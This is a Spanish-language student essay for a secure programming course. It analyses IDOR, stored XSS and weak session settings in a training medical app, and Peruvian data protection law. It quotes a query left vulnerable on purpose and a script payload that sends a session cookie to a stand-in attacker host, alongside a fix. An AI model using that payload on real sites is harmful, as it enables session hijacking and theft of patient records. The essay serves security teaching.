# Reflexión Técnico-Legal — Semana 6
**Alumno:** Omar Rivera Castillo  
**Código:** 2221895826  
**Curso:** Programación Segura DD281 — Universidad Autónoma del Perú  
**Tema:** XSS, Gestión de Sesiones e IDOR en el contexto de una aplicación médica

---

## ¿Cuál de los 3 temas es más crítico para una aplicación médica como MedApp?

Considerando el contexto específico de una aplicación médica, mi postura es que **el IDOR (Insecure Direct Object Reference) es la vulnerabilidad más crítica**, aunque su mayor peligro real proviene de su encadenamiento con XSS y una gestión de sesiones deficiente.

---

## 1. Postura clara

El IDOR es la vulnerabilidad más crítica en MedApp porque permite el acceso directo y silencioso a registros médicos ajenos simplemente modificando un número en la URL. No requiere conocimientos técnicos avanzados: cualquier paciente malintencionado podría incrementar el parámetro `doc_id` de 2 a 1, 3, 4… y leer el historial clínico, diagnósticos, recetas o resultados de laboratorio de otros pacientes. Esta filtración ocurre sin alertas, sin rastro evidente y sin que la víctima lo sepa.

---

## 2. Argumento técnico

En el contexto médico el impacto del IDOR es devastador porque los datos expuestos no son genéricos: son diagnósticos de enfermedades crónicas o terminales, historial psiquiátrico, resultados de pruebas de VIH, medicamentos de uso controlado, y datos de menores de edad. La función `ver_documento(doc_id)` de `app_vulnerable.py` solo verifica que el usuario esté autenticado, pero no comprueba que el documento le pertenezca. La línea crítica es:

```python
doc = conn.execute("SELECT * FROM documentos WHERE id = ?", (doc_id,)).fetchone()
```

La ausencia de `AND propietario_id = ?` significa que cualquier usuario autenticado puede leer cualquier documento del sistema. En un entorno médico real esto equivaldría a que un paciente pudiera leer las historias clínicas de todos los demás pacientes del hospital, o que un médico pudiera acceder a registros fuera de su especialidad o institución.

---

## 3. Relación entre las tres vulnerabilidades: el ataque encadenado

Las tres vulnerabilidades forman una cadena de ataque completa en MedApp:

**Paso 1 — IDOR:** Un atacante autenticado como paciente enumera documentos ajenos incrementando el ID en la URL. Obtiene el historial clínico del paciente objetivo.

**Paso 2 — XSS Almacenado:** El mismo atacante inyecta un payload JavaScript en el campo de comentarios del foro interno de MedApp. Dado que `SESSION_COOKIE_HTTPONLY = False`, el script puede leer la cookie de sesión.

**Paso 3 — Secuestro de sesión:** El payload XSS envía la cookie a un servidor controlado por el atacante:
```javascript
<script>fetch('https://atacante.com/robo?c=' + document.cookie)</script>
```

Cuando un médico o administrador visita la página de comentarios, su cookie de sesión es robada. El atacante ahora puede suplantar al médico, quien tiene acceso a **todos** los historiales del sistema, no solo a los suyos. Las tres vulnerabilidades combinadas escalan los privilegios de un paciente común al nivel de administrador médico.

---

## 4. Marco legal peruano — Ley 29733

La **Ley N° 29733 — Ley de Protección de Datos Personales del Perú** y su Reglamento (D.S. N° 003-2013-JUS) establecen reglas específicas para el tratamiento de datos personales. El artículo 13 clasifica como **datos sensibles** aquellos que revelan origen racial o étnico, opiniones políticas, convicciones religiosas, condición de salud o vida sexual. Los datos médicos —diagnósticos, tratamientos, resultados de laboratorio— entran directamente en esta categoría.

Las consecuencias legales de una brecha de seguridad en MedApp incluyen:

- **Multas administrativas** impuestas por la Autoridad Nacional de Protección de Datos Personales (ANPD, dentro del MINJUS), que pueden alcanzar las 100 UIT para infracciones muy graves.
- **Responsabilidad civil** frente a los pacientes afectados por daño moral y material derivado de la exposición de su información médica.
- **Responsabilidad penal** bajo el artículo 154-A del Código Penal peruano (tráfico ilegal de datos) si la filtración implica comercialización o uso indebido de los datos obtenidos.
- **Suspensión de operaciones** del sistema hasta acreditar el cumplimiento de medidas de seguridad adecuadas.

Los datos de salud reciben protección especial porque su exposición puede generar discriminación laboral (despidos por enfermedades crónicas), daño psicológico irreversible (estigma por condiciones de salud mental) y riesgo físico (violencia basada en diagnósticos revelados sin consentimiento).

---

## 5. Recomendación profesional

Si fuera el consultor de seguridad contratado por MedApp, la **primera medida** que implementaría sería corregir el IDOR mediante autorización a nivel de objeto en todas las consultas de base de datos. En código:

```python
doc = conn.execute(
    "SELECT * FROM documentos WHERE id=? AND propietario_id=?",
    (doc_id, session['user_id'])
).fetchone()
```

Elegiría esta corrección primero porque tiene el mayor impacto con el menor costo de implementación: es un cambio de una línea que bloquea inmediatamente el acceso a registros médicos ajenos. Posterior a esto implementaría el escape HTML contra XSS y la configuración segura de cookies, construyendo la defensa en capas. Ningun sistema médico puede comprometer la confidencialidad del paciente; ese es el principio ético y legal fundamental del sector salud.
